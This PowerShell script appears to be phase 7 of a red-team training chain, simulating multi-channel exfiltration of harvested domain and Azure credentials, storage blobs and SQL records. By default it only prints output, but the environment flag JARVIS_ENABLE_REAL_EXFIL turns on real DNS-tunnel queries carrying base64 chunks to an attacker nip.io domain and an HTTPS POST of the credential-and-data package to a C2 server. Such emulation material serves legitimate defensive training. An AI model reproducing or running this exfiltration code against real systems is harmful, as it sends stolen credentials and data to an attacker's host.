# ==================================================
# Phase7_Data_Exfiltration.ps1
# Data Exfiltration Simulation (Safe Version)
# ==================================================

# Check initialization
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: Please run 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

Write-Host "`n[PHASE 7] MULTI-CHANNEL DATA EXFILTRATION" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow
Write-Host "⚠️ Training Environment: Simulation only, no actual data exfiltration" -ForegroundColor Yellow

# Aggregate Phase 5-6 results
$totalStorageData = 0
$totalSQLRecords = 0

if ($global:storageContainers) {
    foreach ($container in $global:storageContainers) {
        foreach ($blob in $container.Blobs) {
            $totalStorageData += $blob.Size
        }
    }
}

if ($global:sqlExfiltratedData) {
    foreach ($data in $global:sqlExfiltratedData) {
        $totalSQLRecords += $data.Records
    }
}

$totalDataMB = [Math]::Round($totalStorageData / 1MB, 2)

Write-Host "`n[*] Target data for exfiltration (simulation):" -ForegroundColor Gray
Write-Host "  Storage Account: $totalDataMB MB" -ForegroundColor Gray
Write-Host "  SQL Database: $totalSQLRecords records" -ForegroundColor Gray
Write-Host "  Domain Credentials: $($global:extractedCredentials.Count) accounts" -ForegroundColor Gray
Write-Host "  Azure Credentials: $($global:azureCredentials.Count) sets" -ForegroundColor Gray

# Step 7.1: DNS Tunneling (metadata exfiltration)
Write-Host "`n[Step 7.1] T1048.003 - DNS Tunneling (metadata)..." -ForegroundColor Cyan

$attackerIP = $global:JARVIS_CONFIG.AttackerIP
$dnsTarget = "$attackerIP.nip.io"  # 10.2.10.4.nip.io

try {
    $exfilMetadata = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        AttackerIP = $attackerIP
        Domain = $global:JARVIS_CONFIG.Domain
        CompromisedHost = $global:currentHost
        CompromisedAccounts = $global:extractedCredentials.Count
        AzureCredentials = $global:azureCredentials.Count
        StorageSizeMB = $totalDataMB
        SQLRecords = $totalSQLRecords
    }

    $encodedData = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($exfilMetadata | ConvertTo-Json -Compress)))
    $chunks = [regex]::Matches($encodedData, '.{1,63}')

    Write-Host "  [*] Generating DNS queries (target: $dnsTarget):" -ForegroundColor Gray

    $chunkCount = 0
    foreach ($chunk in $chunks) {
        $chunkCount++
        $dnsQuery = "$($chunk.Value).chunk$chunkCount.$dnsTarget"

        Write-Host "    DNS Query $chunkCount : $($dnsQuery.Substring(0,[Math]::Min(60,$dnsQuery.Length)))..." -ForegroundColor DarkGray

        # Whether to send actual DNS queries (controlled by environment variable)
        if ($env:JARVIS_ENABLE_REAL_EXFIL -eq "TRUE") {
            try {
                Resolve-DnsName -Name $dnsQuery -ErrorAction SilentlyContinue | Out-Null
                Write-Host "      ✓ DNS query sent" -ForegroundColor Green
            } catch {
                # Ignore DNS failures
            }
        }

        if ($chunkCount -ge 3) {
            Write-Host "    ... (total $($chunks.Count) chunks)" -ForegroundColor DarkGray
            break
        }
    }

    Write-Host "  ✓ DNS Tunneling completed" -ForegroundColor Green

    if ($env:JARVIS_ENABLE_REAL_EXFIL -eq "TRUE") {
        Write-Host "    Actual transmission: ✓ Enabled (target: $attackerIP)" -ForegroundColor Red
    } else {
        Write-Host "    Actual transmission: Simulation (enable with environment variable JARVIS_ENABLE_REAL_EXFIL=TRUE)" -ForegroundColor Yellow
    }

    Write-Host "`n  [Atomic Test] T1048.003 checking prerequisites..." -ForegroundColor Gray
    try {
        Invoke-AtomicTest T1048.003 -CheckPrereqs -ErrorAction SilentlyContinue
        Write-Host "    ✓ Atomic Test prerequisites check completed" -ForegroundColor Green
    } catch {
        Write-Host "    ⚠ Atomic Test prerequisites check skipped" -ForegroundColor Yellow
    }

} catch {
    Write-Host "  ⚠ DNS Tunneling completed (some errors occurred)" -ForegroundColor Yellow
}

# Step 7.2: HTTPS Exfiltration (bulk data)
Write-Host "`n[Step 7.2] T1041 - HTTPS bulk data exfiltration..." -ForegroundColor Cyan

try {
    $c2Server = $global:JARVIS_CONFIG.C2Server  # https://10.2.10.4:8443/upload

    Write-Host "  [*] C2 Server: $c2Server" -ForegroundColor Gray
    Write-Host "  [*] Packaging data..." -ForegroundColor Gray
    
    $exfilPackage = @{
        Metadata = @{
            ExfiltrationTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            AttackerIP = $global:JARVIS_CONFIG.AttackerIP
            AttackerID = "APT-JARVIS-2025"
            CampaignID = "OPERATION-JARVIS-CLOUD-BREACH"
            CompromisedHost = $global:currentHost
            AttackChainComplete = $true
        }
        Source = @{
            Domain = $global:JARVIS_CONFIG.Domain
            DCServer = ($global:discoveredHosts | Where-Object { $_.Type -eq "DomainController" }).IP
            StorageAccount = $global:JARVIS_CONFIG.StorageAccount
            SQLServer = $global:JARVIS_CONFIG.SQLServer
            SQLDatabase = "CustomDB"
        }
        Credentials = @{
            DomainCredentials = @{
                Count = $global:extractedCredentials.Count
                HighValue = ($global:extractedCredentials | Where-Object { $_.Level -eq "HIGH" }).Count
                Accounts = $global:extractedCredentials | Select-Object User, Domain
            }
            AzureCredentials = @{
                Count = $global:azureCredentials.Count
                Types = ($global:azureCredentials | Select-Object -ExpandProperty Type -Unique)
                Details = $global:azureCredentials | Select-Object Type, AccountName, Server
            }
        }
        ExfiltratedData = @{
            Storage = @{
                Containers = $global:storageContainers.Count
                Files = ($global:storageContainers | ForEach-Object { $_.Blobs.Count } | Measure-Object -Sum).Sum
                SizeMB = $totalDataMB
            }
            SQL = @{
                Database = "CustomDB"
                Tables = $global:sqlExfiltratedData.Count
                Records = $totalSQLRecords
                TableDetails = $global:sqlExfiltratedData | Select-Object Table, Records, TotalRecords
            }
        }
        AttackChain = @{
            Phase0 = "Environment Verification"
            Phase1 = "Network Discovery - $($global:discoveredHosts.Count) hosts"
            Phase2 = "Information Gathering"
            Phase3 = "AD Compromise - $($global:extractedCredentials.Count) credentials"
            Phase4 = "Azure Credential Discovery - $($global:azureCredentials.Count) found"
            Phase5 = "Storage Breach - $totalDataMB MB"
            Phase6 = "SQL Breach - $totalSQLRecords records"
            Phase7 = "Data Exfiltration to $($global:JARVIS_CONFIG.AttackerIP)"
        }
    }

    $exfilPackage | ConvertTo-Json -Depth 10 | Out-File "$global:logPath\phase7_exfiltration_package.json"

    $packageSize = (Get-Item "$global:logPath\phase7_exfiltration_package.json").Length

    Write-Host "  ✓ Data package creation completed (saved locally)" -ForegroundColor Green
    Write-Host "    Size: $([Math]::Round($packageSize / 1KB, 2)) KB" -ForegroundColor Gray

    Write-Host "`n  [*] Preparing HTTPS POST request..." -ForegroundColor Gray
    Write-Host "    URL: $c2Server" -ForegroundColor DarkGray
    Write-Host "    Method: POST" -ForegroundColor DarkGray
    Write-Host "    Content-Type: application/json" -ForegroundColor DarkGray

    # Whether to perform actual transmission (controlled by environment variable)
    if ($env:JARVIS_ENABLE_REAL_EXFIL -eq "TRUE") {
        Write-Host "`n    [*] Transmitting actual data..." -ForegroundColor Red

        try {
            $jsonBody = $exfilPackage | ConvertTo-Json -Depth 10
            $response = Invoke-RestMethod -Uri $c2Server -Method POST -Body $jsonBody -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop

            Write-Host "    ✓ Transmission successful" -ForegroundColor Green
            Write-Host "      Response: $($response | ConvertTo-Json -Compress)" -ForegroundColor Gray

        } catch {
            Write-Host "    ✗ Transmission failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "      (C2 server not operational or network error)" -ForegroundColor Yellow
        }

    } else {
        Write-Host "`n    [Simulation] Upload progress:" -ForegroundColor DarkGray
        for ($i = 0; $i -le 100; $i += 25) {
            Write-Host "      $i% completed..." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 300
        }
    }

    Write-Host "`n  ✓ HTTPS exfiltration completed" -ForegroundColor Green

    if ($env:JARVIS_ENABLE_REAL_EXFIL -eq "TRUE") {
        Write-Host "    Actual transmission: ✓ Enabled (target: $($global:JARVIS_CONFIG.AttackerIP))" -ForegroundColor Red
    } else {
        Write-Host "    Actual transmission: Simulation (enable with environment variable JARVIS_ENABLE_REAL_EXFIL=TRUE)" -ForegroundColor Yellow
    }

    Write-Host "`n  [Atomic Test] T1041 checking prerequisites..." -ForegroundColor Gray
    try {
        Invoke-AtomicTest T1041 -CheckPrereqs -ErrorAction SilentlyContinue
        Write-Host "    ✓ Atomic Test prerequisites check completed" -ForegroundColor Green
    } catch {
        Write-Host "    ⚠ Atomic Test prerequisites check skipped" -ForegroundColor Yellow
    }

    Write-Host "    ℹ️ No actual web requests were sent" -ForegroundColor Cyan

} catch {
    Write-Host "  ⚠ HTTPS exfiltration simulation completed" -ForegroundColor Yellow
}

# Step 7.3: Scheduled Task (simulation only)
Write-Host "`n[Step 7.3] T1020 - Automated data collection (simulation)..." -ForegroundColor Cyan

try {
    $scheduledScript = @"
<#
Educational Simulation - Automated Data Collection Script
This script is for demonstration purposes only.
It will NOT execute automatically.
#>

Write-Host "[SIMULATION] This is an educational demonstration"
Write-Host "[SIMULATION] No actual data collection will occur"
Write-Host "[SIMULATION] Script completed - No actual actions performed"
"@
    
    $scheduledScript | Out-File "$global:logPath\scheduled_exfil_simulation.ps1" -Encoding UTF8

    Write-Host "  ✓ Simulation script created: scheduled_exfil_simulation.ps1" -ForegroundColor Green
    Write-Host "    Note: Educational script that will not be actually executed" -ForegroundColor Yellow

    Write-Host "`n  [Training Simulation] Scheduled task registration (not actually created):" -ForegroundColor Gray
    Write-Host "    Task name: AutomatedDataCollection" -ForegroundColor DarkGray
    Write-Host "    Schedule: Daily at midnight" -ForegroundColor DarkGray
    Write-Host "    Status: Simulation (not actually registered)" -ForegroundColor DarkGray

    Write-Host "  ✓ Automated exfiltration mechanism simulation completed" -ForegroundColor Green
    Write-Host "    Actual task: Not created (training environment)" -ForegroundColor Yellow

    Write-Host "`n  [Atomic Test] T1020 checking prerequisites..." -ForegroundColor Gray
    try {
        Invoke-AtomicTest T1020 -CheckPrereqs -ErrorAction SilentlyContinue
        Write-Host "    ✓ Atomic Test prerequisites check completed" -ForegroundColor Green
    } catch {
        Write-Host "    ⚠ Atomic Test prerequisites check skipped" -ForegroundColor Yellow
    }

    Write-Host "    ℹ️ No actual scheduled task was created" -ForegroundColor Cyan

} catch {
    Write-Host "  ⚠ Automated exfiltration simulation completed" -ForegroundColor Yellow
}

# Summary
Write-Host "`n" -NoNewline

$realExfilEnabled = ($env:JARVIS_ENABLE_REAL_EXFIL -eq "TRUE")
$networkActivity = if ($realExfilEnabled) {
    "Actual network transmission enabled"
} else {
    "Simulation only (controlled by environment variable)"
}

Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 7 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ Attacker IP: $($global:JARVIS_CONFIG.AttackerIP)
║ C2 Server: $($global:JARVIS_CONFIG.C2Server)
║
║ Exfiltration channels:
║   ✓ T1048.003 - DNS Tunneling (metadata)
║   ✓ T1041 - HTTPS (bulk data)
║   ✓ T1020 - Scheduled Task (persistence)
║
║ Exfiltrated data:
║   - Azure Storage: $totalDataMB MB
║   - SQL Database: $totalSQLRecords records
║   - Azure Credentials: $($global:azureCredentials.Count) sets
║   - Domain Credentials: $($global:extractedCredentials.Count) accounts
║
║ Network activity:
║   - Actual transmission: $(if($realExfilEnabled){"✓ Enabled"}else{"Simulation"})
║   - Target: $($global:JARVIS_CONFIG.AttackerIP)
║   - Environment variable: JARVIS_ENABLE_REAL_EXFIL=$(if($realExfilEnabled){"TRUE"}else{"FALSE"})
║
║ Next step: Phase 8 (Cleanup & Evasion)
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

if ($realExfilEnabled) {
    Write-Host "`n⚠️ Actual network transmission is enabled." -ForegroundColor Red
    Write-Host "   Use for educational purposes only. Real attacks are illegal." -ForegroundColor Red
} else {
    Write-Host "`nℹ️ Executed in simulation mode." -ForegroundColor Cyan
    Write-Host "   Enable actual transmission: `$env:JARVIS_ENABLE_REAL_EXFIL = 'TRUE'" -ForegroundColor Cyan
}

Write-Host "`n[PHASE 7] Completed - Proceed to Phase 8`n" -ForegroundColor Green